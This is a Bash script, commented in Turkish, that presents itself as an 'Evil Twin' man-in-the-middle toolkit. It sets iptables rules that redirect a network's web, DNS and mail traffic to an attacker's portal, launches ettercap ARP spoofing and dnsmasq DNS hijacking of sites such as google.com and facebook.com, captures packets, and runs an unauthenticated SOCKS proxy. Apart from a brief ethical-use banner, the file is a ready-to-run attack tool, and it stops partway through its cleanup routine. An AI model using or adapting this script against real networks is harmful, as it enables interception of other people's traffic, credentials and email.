#!/bin/bash

# Evil Twin Attack - Traffic Redirection and MITM Script
# Bu script trafik yönlendirme ve man-in-the-middle saldırıları yapar
# Kullanım: ./traffic_redirect.sh [interface] [options]

# Renkli çıktı için ANSI kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Banner
echo -e "${PURPLE}"
echo "═══════════════════════════════════════════════════════════════"
echo "                    EVIL TWIN ATTACK TOOLKIT                  "
echo "                 Traffic Redirection & MITM                   "
echo "═══════════════════════════════════════════════════════════════"
echo -e "${NC}"

# Root kontrolü
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Bu script root yetkileri ile çalıştırılmalıdır!${NC}"
   echo -e "${YELLOW}[*] Kullanım: sudo $0 [interface] [options]${NC}"
   exit 1
fi

# Etik uyarı
echo -e "${RED}"
echo "⚠️  ETİK UYARI ⚠️"
echo "Bu araç yalnızca eğitim amaçlı ve kendi ağlarınızda test için kullanılmalıdır."
echo "Trafik yönlendirme ve MITM saldırıları yasadışıdır ve ciddi hukuki sonuçları olabilir."
echo "Bu aracı kullanarak tüm sorumluluğu kabul etmiş olursunuz."
echo -e "${NC}"

# Parametreler
INTERFACE="$1"
GATEWAY_IP="192.168.1.1"
NETWORK_RANGE="192.168.1.0/24"
TARGET_IP=""
REDIRECT_HTTP=true
REDIRECT_HTTPS=false
REDIRECT_DNS=false
REDIRECT_FTP=false
REDIRECT_SMTP=false
REDIRECT_POP3=false
REDIRECT_IMAP=false
CAPTIVE_PORTAL_IP="192.168.1.1"
CAPTIVE_PORTAL_PORT="80"
FAKE_DNS_SERVER="8.8.8.8"
OUTPUT_DIR="/tmp/evil_twin_redirect"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_FILE="$OUTPUT_DIR/traffic_redirect_$TIMESTAMP.log"
CAPTURE_FILE="$OUTPUT_DIR/traffic_capture_$TIMESTAMP.pcap"
IPTABLES_BACKUP="$OUTPUT_DIR/iptables_backup_$TIMESTAMP.txt"
BLACKLIST_FILE="$OUTPUT_DIR/blacklist_domains.txt"
WHITELIST_FILE="$OUTPUT_DIR/whitelist_domains.txt"
REDIRECT_LOG="$OUTPUT_DIR/redirect_log_$TIMESTAMP.txt"
VERBOSE=false
AUTO_START=false
KILL_EXISTING=false
BACKUP_IPTABLES=true
ENABLE_LOGGING=true
ENABLE_PACKET_CAPTURE=false
BLOCK_MODE=false
WHITELIST_MODE=false
TRANSPARENT_PROXY=false
SOCKS_PROXY=false
SOCKS_PORT="1080"
HTTP_PROXY_PORT="3128"
DNS_HIJACK=false
ARP_SPOOFING=false
DHCP_SPOOFING=false
SSL_KILL_SWITCH=false

# Global değişkenler
declare -A REDIRECT_RULES
declare -A ACTIVE_CONNECTIONS
ETTERCAP_PID=""
TCPDUMP_PID=""
DNSMASQ_PID=""
SOCKS_PROXY_PID=""
HTTP_PROXY_PID=""
ORIGINAL_IPTABLES=""
IP_FORWARD_ORIGINAL=""
REDIRECT_COUNT=0
BLOCKED_COUNT=0
CAPTURED_PACKETS=0

# Fonksiyonlar
print_status() {
    echo -e "${BLUE}[*] $1${NC}"
    [ "$ENABLE_LOGGING" = true ] && echo "$(date): [INFO] $1" >> "$LOG_FILE"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
    [ "$ENABLE_LOGGING" = true ] && echo "$(date): [SUCCESS] $1" >> "$LOG_FILE"
}

print_error() {
    echo -e "${RED}[!] $1${NC}"
    [ "$ENABLE_LOGGING" = true ] && echo "$(date): [ERROR] $1" >> "$LOG_FILE"
}

print_warning() {
    echo -e "${YELLOW}[⚠] $1${NC}"
    [ "$ENABLE_LOGGING" = true ] && echo "$(date): [WARNING] $1" >> "$LOG_FILE"
}

print_redirect() {
    echo -e "${CYAN}[→] $1${NC}"
    [ "$ENABLE_LOGGING" = true ] && echo "$(date): [REDIRECT] $1" >> "$REDIRECT_LOG"
    ((REDIRECT_COUNT++))
}

# Kullanım bilgisi
show_usage() {
    echo -e "${YELLOW}Kullanım:${NC}"
    echo -e "  ${CYAN}$0 [interface] [options]${NC}"
    echo
    echo -e "${YELLOW}Parametreler:${NC}"
    echo -e "  ${CYAN}interface${NC}     Ağ arayüzü (örn: eth0, wlan0)"
    echo
    echo -e "${YELLOW}Seçenekler:${NC}"
    echo -e "  ${CYAN}-g, --gateway <ip>${NC}       Gateway IP (varsayılan: 192.168.1.1)"
    echo -e "  ${CYAN}-n, --network <range>${NC}    Ağ aralığı (varsayılan: 192.168.1.0/24)"
    echo -e "  ${CYAN}-t, --target <ip>${NC}        Hedef IP (boşsa tüm ağ)"
    echo -e "  ${CYAN}-c, --captive <ip:port>${NC}  Captive portal adresi"
    echo -e "  ${CYAN}-o, --output <dir>${NC}       Çıktı dizini"
    echo -e "  ${CYAN}--http${NC}                   HTTP yönlendirme (varsayılan: açık)"
    echo -e "  ${CYAN}--https${NC}                  HTTPS yönlendirme"
    echo -e "  ${CYAN}--dns${NC}                    DNS yönlendirme"
    echo -e "  ${CYAN}--ftp${NC}                    FTP yönlendirme"
    echo -e "  ${CYAN}--smtp${NC}                   SMTP yönlendirme"
    echo -e "  ${CYAN}--pop3${NC}                   POP3 yönlendirme"
    echo -e "  ${CYAN}--imap${NC}                   IMAP yönlendirme"
    echo -e "  ${CYAN}--all-protocols${NC}          Tüm protokoller"
    echo -e "  ${CYAN}-b, --block-mode${NC}         Engelleme modu"
    echo -e "  ${CYAN}-w, --whitelist-mode${NC}     Beyaz liste modu"
    echo -e "  ${CYAN}-p, --transparent-proxy${NC}  Şeffaf proxy"
    echo -e "  ${CYAN}-s, --socks-proxy${NC}        SOCKS proxy"
    echo -e "  ${CYAN}--socks-port <port>${NC}      SOCKS port (varsayılan: 1080)"
    echo -e "  ${CYAN}--http-proxy-port <port>${NC} HTTP proxy port (varsayılan: 3128)"
    echo -e "  ${CYAN}--dns-hijack${NC}             DNS hijacking"
    echo -e "  ${CYAN}--arp-spoof${NC}              ARP spoofing"
    echo -e "  ${CYAN}--dhcp-spoof${NC}             DHCP spoofing"
    echo -e "  ${CYAN}--ssl-kill${NC}               SSL kill switch"
    echo -e "  ${CYAN}--packet-capture${NC}         Paket yakalama"
    echo -e "  ${CYAN}-a, --auto-start${NC}         Otomatik başlat"
    echo -e "  ${CYAN}-k, --kill-existing${NC}      Mevcut süreçleri sonlandır"
    echo -e "  ${CYAN}--no-backup${NC}              Iptables yedekleme"
    echo -e "  ${CYAN}--no-logging${NC}             Log kaydı devre dışı"
    echo -e "  ${CYAN}-v, --verbose${NC}            Detaylı çıktı"
    echo -e "  ${CYAN}-h, --help${NC}               Bu yardım mesajı"
    echo
    echo -e "${YELLOW}Örnekler:${NC}"
    echo -e "  ${CYAN}sudo $0 eth0${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0 --https --dns${NC}"
    echo -e "  ${CYAN}sudo $0 eth0 -c 192.168.1.100:8080 --all-protocols${NC}"
    echo -e "  ${CYAN}sudo $0 wlan0 -b --packet-capture${NC}"
    echo -e "  ${CYAN}sudo $0 eth0 -p --socks-proxy --dns-hijack${NC}"
    echo
}

# Komut satırı argümanlarını işle
parse_arguments() {
    # İlk parametre pozisyonel
    if [ $# -ge 1 ]; then
        INTERFACE="$1"
        shift
    fi
    
    # Kalan parametreler seçenekler
    while [[ $# -gt 0 ]]; do
        case $1 in
            -g|--gateway)
                GATEWAY_IP="$2"
                shift 2
                ;;
            -n|--network)
                NETWORK_RANGE="$2"
                shift 2
                ;;
            -t|--target)
                TARGET_IP="$2"
                shift 2
                ;;
            -c|--captive)
                if [[ "$2" =~ ^([0-9.]+):([0-9]+)$ ]]; then
                    CAPTIVE_PORTAL_IP="${BASH_REMATCH[1]}"
                    CAPTIVE_PORTAL_PORT="${BASH_REMATCH[2]}"
                else
                    CAPTIVE_PORTAL_IP="$2"
                fi
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            --http)
                REDIRECT_HTTP=true
                shift
                ;;
            --https)
                REDIRECT_HTTPS=true
                shift
                ;;
            --dns)
                REDIRECT_DNS=true
                shift
                ;;
            --ftp)
                REDIRECT_FTP=true
                shift
                ;;
            --smtp)
                REDIRECT_SMTP=true
                shift
                ;;
            --pop3)
                REDIRECT_POP3=true
                shift
                ;;
            --imap)
                REDIRECT_IMAP=true
                shift
                ;;
            --all-protocols)
                REDIRECT_HTTP=true
                REDIRECT_HTTPS=true
                REDIRECT_DNS=true
                REDIRECT_FTP=true
                REDIRECT_SMTP=true
                REDIRECT_POP3=true
                REDIRECT_IMAP=true
                shift
                ;;
            -b|--block-mode)
                BLOCK_MODE=true
                shift
                ;;
            -w|--whitelist-mode)
                WHITELIST_MODE=true
                shift
                ;;
            -p|--transparent-proxy)
                TRANSPARENT_PROXY=true
                shift
                ;;
            -s|--socks-proxy)
                SOCKS_PROXY=true
                shift
                ;;
            --socks-port)
                SOCKS_PORT="$2"
                shift 2
                ;;
            --http-proxy-port)
                HTTP_PROXY_PORT="$2"
                shift 2
                ;;
            --dns-hijack)
                DNS_HIJACK=true
                shift
                ;;
            --arp-spoof)
                ARP_SPOOFING=true
                shift
                ;;
            --dhcp-spoof)
                DHCP_SPOOFING=true
                shift
                ;;
            --ssl-kill)
                SSL_KILL_SWITCH=true
                shift
                ;;
            --packet-capture)
                ENABLE_PACKET_CAPTURE=true
                shift
                ;;
            -a|--auto-start)
                AUTO_START=true
                shift
                ;;
            -k|--kill-existing)
                KILL_EXISTING=true
                shift
                ;;
            --no-backup)
                BACKUP_IPTABLES=false
                shift
                ;;
            --no-logging)
                ENABLE_LOGGING=false
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            -*)
                print_error "Bilinmeyen seçenek: $1"
                show_usage
                exit 1
                ;;
            *)
                print_error "Fazla parametre: $1"
                show_usage
                exit 1
                ;;
        esac
    done
}

# Parametreleri kontrol et
validate_parameters() {
    if [ -z "$INTERFACE" ]; then
        print_error "Arayüz belirtilmedi!"
        show_usage
        exit 1
    fi
    
    # Arayüz kontrolü
    if ! ip link show "$INTERFACE" &>/dev/null; then
        print_error "Arayüz bulunamadı: $INTERFACE"
        exit 1
    fi
    
    # IP adresi kontrolü
    if ! [[ "$GATEWAY_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        print_error "Geçersiz gateway IP: $GATEWAY_IP"
        exit 1
    fi
    
    if ! [[ "$CAPTIVE_PORTAL_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        print_error "Geçersiz captive portal IP: $CAPTIVE_PORTAL_IP"
        exit 1
    fi
}

# Gerekli araçları kontrol et
check_dependencies() {
    print_status "Gerekli araçlar kontrol ediliyor..."
    
    local missing_tools=()
    
    # Temel araçlar
    local required_tools=("iptables" "ip" "netstat")
    
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing_tools+=("$tool")
        fi
    done
    
    # Opsiyonel araçlar
    if [ "$ARP_SPOOFING" = true ]; then
        if ! command -v "ettercap" &> /dev/null; then
            missing_tools+=("ettercap")
        fi
    fi
    
    if [ "$ENABLE_PACKET_CAPTURE" = true ]; then
        if ! command -v "tcpdump" &> /dev/null; then
            missing_tools+=("tcpdump")
        fi
    fi
    
    if [ "$DNS_HIJACK" = true ]; then
        if ! command -v "dnsmasq" &> /dev/null; then
            missing_tools+=("dnsmasq")
        fi
    fi
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        print_error "Eksik araçlar: ${missing_tools[*]}"
        print_status "Kurulum için: apt-get install iptables iproute2 net-tools ettercap-text-only tcpdump dnsmasq"
        exit 1
    fi
    
    print_success "Tüm gerekli araçlar mevcut"
}

# Çıktı dizinini hazırla
setup_output_directory() {
    if [ ! -d "$OUTPUT_DIR" ]; then
        mkdir -p "$OUTPUT_DIR"
        print_status "Çıktı dizini oluşturuldu: $OUTPUT_DIR"
    fi
    
    # Dosya yollarını güncelle
    LOG_FILE="$OUTPUT_DIR/traffic_redirect_$TIMESTAMP.log"
    CAPTURE_FILE="$OUTPUT_DIR/traffic_capture_$TIMESTAMP.pcap"
    IPTABLES_BACKUP="$OUTPUT_DIR/iptables_backup_$TIMESTAMP.txt"
    BLACKLIST_FILE="$OUTPUT_DIR/blacklist_domains.txt"
    WHITELIST_FILE="$OUTPUT_DIR/whitelist_domains.txt"
    REDIRECT_LOG="$OUTPUT_DIR/redirect_log_$TIMESTAMP.txt"
    
    print_status "Log dosyası: $LOG_FILE"
    print_status "Yakalama dosyası: $CAPTURE_FILE"
}

# Mevcut süreçleri sonlandır
kill_existing_processes() {
    if [ "$KILL_EXISTING" = true ]; then
        print_status "Mevcut süreçler sonlandırılıyor..."
        
        # Ettercap
        pkill -f "ettercap" 2>/dev/null && print_status "Ettercap sonlandırıldı"
        
        # Tcpdump
        pkill -f "tcpdump" 2>/dev/null && print_status "Tcpdump sonlandırıldı"
        
        # Dnsmasq
        pkill -f "dnsmasq" 2>/dev/null && print_status "Dnsmasq sonlandırıldı"
        
        # Proxy süreçleri
        pkill -f "3proxy" 2>/dev/null && print_status "3proxy sonlandırıldı"
        pkill -f "squid" 2>/dev/null && print_status "Squid sonlandırıldı"
        
        sleep 2
    fi
}

# Iptables kurallarını yedekle
backup_iptables() {
    if [ "$BACKUP_IPTABLES" = true ]; then
        print_status "Iptables kuralları yedekleniyor..."
        
        iptables-save > "$IPTABLES_BACKUP"
        
        if [ $? -eq 0 ]; then
            print_success "Iptables yedeklendi: $IPTABLES_BACKUP"
        else
            print_warning "Iptables yedeklenemedi"
        fi
    fi
}

# IP forwarding etkinleştir
enable_ip_forwarding() {
    print_status "IP forwarding etkinleştiriliyor..."
    
    # Mevcut durumu kaydet
    IP_FORWARD_ORIGINAL=$(cat /proc/sys/net/ipv4/ip_forward)
    
    # IP forwarding etkinleştir
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    if [ $(cat /proc/sys/net/ipv4/ip_forward) -eq 1 ]; then
        print_success "IP forwarding etkinleştirildi"
    else
        print_error "IP forwarding etkinleştirilemedi"
        exit 1
    fi
}

# Domain listelerini oluştur
create_domain_lists() {
    print_status "Domain listeleri oluşturuluyor..."
    
    # Blacklist (engellenecek domainler)
    cat > "$BLACKLIST_FILE" << EOF
# Engellenecek domainler
facebook.com
twitter.com
youtube.com
instagram.com
tiktok.com
netflix.com
spotify.com
gaming.com
steam.com
twitch.tv
reddit.com
9gag.com
EOF
    
    # Whitelist (izin verilen domainler)
    cat > "$WHITELIST_FILE" << EOF
# İzin verilen domainler
google.com
wikipedia.org
education.com
university.edu
government.gov
news.com
bbc.com
cnn.com
EOF
    
    print_success "Domain listeleri oluşturuldu"
}

# Iptables yönlendirme kurallarını ayarla
setup_redirect_rules() {
    print_status "Yönlendirme kuralları ayarlanıyor..."
    
    local target_spec=""
    if [ -n "$TARGET_IP" ]; then
        target_spec="-s $TARGET_IP"
    else
        target_spec="-s $NETWORK_RANGE"
    fi
    
    # HTTP yönlendirme
    if [ "$REDIRECT_HTTP" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 80 -j DROP
            print_status "HTTP trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 80 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
            print_status "HTTP trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
        fi
        REDIRECT_RULES["HTTP"]="80->$CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
    fi
    
    # HTTPS yönlendirme
    if [ "$REDIRECT_HTTPS" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 443 -j DROP
            print_status "HTTPS trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 443 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
            print_status "HTTPS trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
        fi
        REDIRECT_RULES["HTTPS"]="443->$CAPTIVE_PORTAL_IP:$CAPTIVE_PORTAL_PORT"
    fi
    
    # DNS yönlendirme
    if [ "$REDIRECT_DNS" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p udp --dport 53 -j DROP
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 53 -j DROP
            print_status "DNS trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p udp --dport 53 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:53"
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 53 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:53"
            print_status "DNS trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:53"
        fi
        REDIRECT_RULES["DNS"]="53->$CAPTIVE_PORTAL_IP:53"
    fi
    
    # FTP yönlendirme
    if [ "$REDIRECT_FTP" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 21 -j DROP
            print_status "FTP trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 21 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:21"
            print_status "FTP trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:21"
        fi
        REDIRECT_RULES["FTP"]="21->$CAPTIVE_PORTAL_IP:21"
    fi
    
    # SMTP yönlendirme
    if [ "$REDIRECT_SMTP" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 25 -j DROP
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 587 -j DROP
            print_status "SMTP trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 25 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:25"
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 587 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:587"
            print_status "SMTP trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:25,587"
        fi
        REDIRECT_RULES["SMTP"]="25,587->$CAPTIVE_PORTAL_IP:25,587"
    fi
    
    # POP3 yönlendirme
    if [ "$REDIRECT_POP3" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 110 -j DROP
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 995 -j DROP
            print_status "POP3 trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 110 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:110"
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 995 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:995"
            print_status "POP3 trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:110,995"
        fi
        REDIRECT_RULES["POP3"]="110,995->$CAPTIVE_PORTAL_IP:110,995"
    fi
    
    # IMAP yönlendirme
    if [ "$REDIRECT_IMAP" = true ]; then
        if [ "$BLOCK_MODE" = true ]; then
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 143 -j DROP
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 993 -j DROP
            print_status "IMAP trafiği engelleniyor"
        else
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 143 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:143"
            iptables -t nat -A PREROUTING $target_spec -p tcp --dport 993 -j DNAT --to-destination "$CAPTIVE_PORTAL_IP:993"
            print_status "IMAP trafiği yönlendiriliyor: $CAPTIVE_PORTAL_IP:143,993"
        fi
        REDIRECT_RULES["IMAP"]="143,993->$CAPTIVE_PORTAL_IP:143,993"
    fi
    
    # Masquerading etkinleştir
    iptables -t nat -A POSTROUTING -o "$INTERFACE" -j MASQUERADE
    
    # Forward kuralları
    iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
    iptables -A FORWARD -i "$INTERFACE" -o "$INTERFACE" -j ACCEPT
    
    print_success "Yönlendirme kuralları ayarlandı"
}

# Şeffaf proxy ayarla
setup_transparent_proxy() {
    if [ "$TRANSPARENT_PROXY" = true ]; then
        print_status "Şeffaf proxy ayarlanıyor..."
        
        # HTTP proxy için yönlendirme
        iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port "$HTTP_PROXY_PORT"
        iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port "$HTTP_PROXY_PORT"
        
        print_success "Şeffaf proxy ayarlandı (port: $HTTP_PROXY_PORT)"
    fi
}

# SOCKS proxy başlat
start_socks_proxy() {
    if [ "$SOCKS_PROXY" = true ]; then
        print_status "SOCKS proxy başlatılıyor..."
        
        # 3proxy kullanarak SOCKS proxy başlat
        if command -v "3proxy" &> /dev/null; then
            cat > "$OUTPUT_DIR/3proxy.cfg" << EOF
nserver
nscache 65536
timeouts 1 5 30 60 180 1800 15 60
daemon
log $OUTPUT_DIR/3proxy.log D
logformat "- +_L%t.%. %N.%p %E %U %C:%c %R:%r %O %I %h %T"
archive 7
rotate 30
auth none
allow * * * 80-88,8080-8088 HTTP
allow * * * 443,8443 HTTPS
socks -p$SOCKS_PORT
EOF
            
            nohup 3proxy "$OUTPUT_DIR/3proxy.cfg" > "$OUTPUT_DIR/socks_proxy_$TIMESTAMP.txt" 2>&1 &
            SOCKS_PROXY_PID=$!
            
            sleep 2
            
            if kill -0 "$SOCKS_PROXY_PID" 2>/dev/null; then
                print_success "SOCKS proxy başlatıldı (PID: $SOCKS_PROXY_PID, Port: $SOCKS_PORT)"
                echo "$SOCKS_PROXY_PID" > "$OUTPUT_DIR/socks_proxy.pid"
            else
                print_warning "SOCKS proxy başlatılamadı"
            fi
        else
            print_warning "3proxy bulunamadı, SOCKS proxy atlanıyor"
        fi
    fi
}

# DNS hijacking başlat
start_dns_hijacking() {
    if [ "$DNS_HIJACK" = true ]; then
        print_status "DNS hijacking başlatılıyor..."
        
        # Dnsmasq yapılandırması
        cat > "$OUTPUT_DIR/dnsmasq.conf" << EOF
# DNS Hijacking Configuration
interface=$INTERFACE
bind-interfaces
listen-address=$CAPTIVE_PORTAL_IP
port=53
no-resolv
no-poll
server=8.8.8.8
server=8.8.4.4
log-queries
log-facility=$OUTPUT_DIR/dnsmasq.log

# Captive portal yönlendirmeleri
address=/google.com/$CAPTIVE_PORTAL_IP
address=/facebook.com/$CAPTIVE_PORTAL_IP
address=/twitter.com/$CAPTIVE_PORTAL_IP
address=/youtube.com/$CAPTIVE_PORTAL_IP
address=/instagram.com/$CAPTIVE_PORTAL_IP
EOF
        
        # Blacklist domainleri ekle
        if [ -f "$BLACKLIST_FILE" ]; then
            while read -r domain; do
                [ -z "$domain" ] || [[ "$domain" =~ ^# ]] && continue
                echo "address=/$domain/$CAPTIVE_PORTAL_IP" >> "$OUTPUT_DIR/dnsmasq.conf"
            done < "$BLACKLIST_FILE"
        fi
        
        # Dnsmasq başlat
        nohup dnsmasq -C "$OUTPUT_DIR/dnsmasq.conf" > "$OUTPUT_DIR/dnsmasq_output_$TIMESTAMP.txt" 2>&1 &
        DNSMASQ_PID=$!
        
        sleep 2
        
        if kill -0 "$DNSMASQ_PID" 2>/dev/null; then
            print_success "DNS hijacking başlatıldı (PID: $DNSMASQ_PID)"
            echo "$DNSMASQ_PID" > "$OUTPUT_DIR/dnsmasq.pid"
        else
            print_warning "DNS hijacking başlatılamadı"
        fi
    fi
}

# ARP spoofing başlat
start_arp_spoofing() {
    if [ "$ARP_SPOOFING" = true ]; then
        print_status "ARP spoofing başlatılıyor..."
        
        # Ettercap ile ARP spoofing
        local target_spec=""
        if [ -n "$TARGET_IP" ]; then
            target_spec="/$TARGET_IP//"
        else
            target_spec="/$NETWORK_RANGE//"
        fi
        
        nohup ettercap -T -M arp:remote $target_spec > "$OUTPUT_DIR/ettercap_output_$TIMESTAMP.txt" 2>&1 &
        ETTERCAP_PID=$!
        
        sleep 3
        
        if kill -0 "$ETTERCAP_PID" 2>/dev/null; then
            print_success "ARP spoofing başlatıldı (PID: $ETTERCAP_PID)"
            echo "$ETTERCAP_PID" > "$OUTPUT_DIR/ettercap.pid"
        else
            print_warning "ARP spoofing başlatılamadı"
        fi
    fi
}

# Paket yakalama başlat
start_packet_capture() {
    if [ "$ENABLE_PACKET_CAPTURE" = true ]; then
        print_status "Paket yakalama başlatılıyor..."
        
        # Tcpdump ile paket yakalama
        local filter=""
        if [ -n "$TARGET_IP" ]; then
            filter="host $TARGET_IP"
        else
            filter="net $NETWORK_RANGE"
        fi
        
        nohup tcpdump -i "$INTERFACE" -w "$CAPTURE_FILE" $filter > "$OUTPUT_DIR/tcpdump_output_$TIMESTAMP.txt" 2>&1 &
        TCPDUMP_PID=$!
        
        sleep 2
        
        if kill -0 "$TCPDUMP_PID" 2>/dev/null; then
            print_success "Paket yakalama başlatıldı (PID: $TCPDUMP_PID)"
            echo "$TCPDUMP_PID" > "$OUTPUT_DIR/tcpdump.pid"
        else
            print_warning "Paket yakalama başlatılamadı"
        fi
    fi
}

# SSL kill switch
setup_ssl_kill_switch() {
    if [ "$SSL_KILL_SWITCH" = true ]; then
        print_status "SSL kill switch ayarlanıyor..."
        
        # HTTPS trafiğini engelle
        iptables -A FORWARD -p tcp --dport 443 -j DROP
        iptables -A OUTPUT -p tcp --dport 443 -j DROP
        
        # SSL/TLS portlarını engelle
        for port in 993 995 465 587 636 989 990; do
            iptables -A FORWARD -p tcp --dport $port -j DROP
            iptables -A OUTPUT -p tcp --dport $port -j DROP
        done
        
        print_success "SSL kill switch etkinleştirildi"
    fi
}

# Durum kontrolü
check_status() {
    echo
    print_status "Sistem durumu kontrol ediliyor..."
    
    # IP forwarding durumu
    if [ $(cat /proc/sys/net/ipv4/ip_forward) -eq 1 ]; then
        print_success "IP forwarding etkin"
    else
        print_error "IP forwarding devre dışı"
    fi
    
    # Ettercap durumu
    if [ -n "$ETTERCAP_PID" ] && kill -0 "$ETTERCAP_PID" 2>/dev/null; then
        print_success "Ettercap çalışıyor (PID: $ETTERCAP_PID)"
    elif [ "$ARP_SPOOFING" = true ]; then
        print_error "Ettercap çalışmıyor"
    fi
    
    # Tcpdump durumu
    if [ -n "$TCPDUMP_PID" ] && kill -0 "$TCPDUMP_PID" 2>/dev/null; then
        print_success "Tcpdump çalışıyor (PID: $TCPDUMP_PID)"
    elif [ "$ENABLE_PACKET_CAPTURE" = true ]; then
        print_error "Tcpdump çalışmıyor"
    fi
    
    # Dnsmasq durumu
    if [ -n "$DNSMASQ_PID" ] && kill -0 "$DNSMASQ_PID" 2>/dev/null; then
        print_success "Dnsmasq çalışıyor (PID: $DNSMASQ_PID)"
    elif [ "$DNS_HIJACK" = true ]; then
        print_error "Dnsmasq çalışmıyor"
    fi
    
    # SOCKS proxy durumu
    if [ -n "$SOCKS_PROXY_PID" ] && kill -0 "$SOCKS_PROXY_PID" 2>/dev/null; then
        print_success "SOCKS proxy çalışıyor (PID: $SOCKS_PROXY_PID)"
    elif [ "$SOCKS_PROXY" = true ]; then
        print_error "SOCKS proxy çalışmıyor"
    fi
    
    # Aktif yönlendirme kuralları
    if [ ${#REDIRECT_RULES[@]} -gt 0 ]; then
        print_success "Aktif yönlendirme kuralları:"
        for protocol in "${!REDIRECT_RULES[@]}"; do
            echo -e "  ${CYAN}$protocol:${NC} ${REDIRECT_RULES[$protocol]}"
        done
    fi
    
    # İstatistikler
    echo
    print_status "İstatistikler:"
    echo -e "  ${CYAN}Yönlendirme sayısı:${NC} $REDIRECT_COUNT"
    echo -e "  ${CYAN}Engelleme sayısı:${NC} $BLOCKED_COUNT"
    
    if [ -f "$CAPTURE_FILE" ]; then
        local packet_count=$(tcpdump -r "$CAPTURE_FILE" 2>/dev/null | wc -l)
        echo -e "  ${CYAN}Yakalanan paket:${NC} $packet_count"
    fi
    
    echo
}

# Trafik izleme
monitor_traffic() {
    print_status "Trafik izleme başlatılıyor... (Ctrl+C ile çıkış)"
    
    while true; do
        clear
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}                    TRAFİK İZLEME PANELI                      ${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
        
        # Sistem durumu
        check_status
        
        # Aktif bağlantılar
        echo -e "${YELLOW}Aktif Bağlantılar:${NC}"
        netstat -tn | grep ESTABLISHED | head -10
        
        echo
        echo -e "${YELLOW}Son Yönlendirmeler:${NC}"
        if [ -f "$REDIRECT_LOG" ]; then
            tail -5 "$REDIRECT_LOG" | while read -r line; do
                echo -e "  ${CYAN}$line${NC}"
            done
        fi
        
        echo
        echo -e "${BLUE}Güncelleme: $(date)${NC}"
        
        sleep 5
    done
}

# Temizlik
cleanup() {
    print_status "Temizlik yapılıyor..."
    
    # Süreçleri sonlandır
    if [ -n "$ETTERCAP_PID" ]; then
        kill "$ETTERCAP_PID" 2>/dev/null
        print_status "Ettercap sonlandırıldı"
    fi
    
    if [ -n "$TCPDUMP_PID" ]; then
        kill "$TCPDUMP_PID" 2>/dev/null
        print_status "Tcpdump sonlandırıldı"
    fi
    
    if [ -n "$DNSMASQ_PID" ]; then
